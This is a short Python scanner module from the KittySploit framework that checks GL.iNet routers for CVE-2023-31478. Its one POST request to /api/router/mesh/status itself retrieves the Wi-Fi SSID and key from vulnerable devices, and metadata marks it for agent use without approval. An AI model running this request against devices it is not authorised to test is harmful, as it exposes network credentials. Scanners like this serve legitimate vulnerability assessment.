#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered on GL."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GL.iNET SSID Key Disclosure Detection',
        'description': 'An issue was discovered on GL.iNet devices before 3.216. An API endpoint reveals information about the Wi-Fi configuration, including the SSID and key.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'gl-inet', 'disclosure', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.gl-inet.com'],
        'cve': 'CVE-2023-31478',
    }

    def run(self):
        path = '/api/router/mesh/status'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='mac=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"ssid":', '"encryption":',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='GL.iNET SSID Key Disclosure detected', path=path)
            return True
        return False

